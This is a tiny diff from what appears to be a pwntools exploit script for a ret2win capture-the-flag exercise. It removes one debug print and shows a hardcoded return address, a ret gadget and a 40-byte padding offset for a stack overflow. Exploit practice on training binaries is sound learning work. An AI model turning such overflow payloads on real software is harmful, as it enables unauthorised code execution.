@@ -6,7 +6,6 @@ context.binary = chall
 context.bits = 64
 
 ret2win_address = p64(0x400756)
-print(ret2win_address)
 ret_gadget = p64(0x40053e)
 offset = b'A'*40
 
